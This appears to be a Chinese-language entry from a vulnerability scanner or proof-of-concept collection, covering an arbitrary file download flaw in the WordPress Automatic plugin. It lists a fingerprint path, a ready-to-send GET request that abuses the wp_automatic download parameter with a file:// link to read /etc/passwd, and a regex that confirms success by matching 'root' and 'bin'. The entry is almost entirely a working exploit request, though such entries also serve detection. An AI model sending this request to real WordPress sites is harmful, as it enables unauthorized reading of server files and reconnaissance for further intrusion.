# WordPressAutomaticPlugin任意文件下载漏洞

WordPress ｜ 其他 ｜ —
- **指纹**：`"/wp-content/plugins/wp-automatic"`
- **请求**：`GET /?p=3232&wp_automatic=download&link=file:///etc/passwd HTTP/1.1`
- **响应特征**：200 ^(?=.*?root)(?=.*?bin).*?$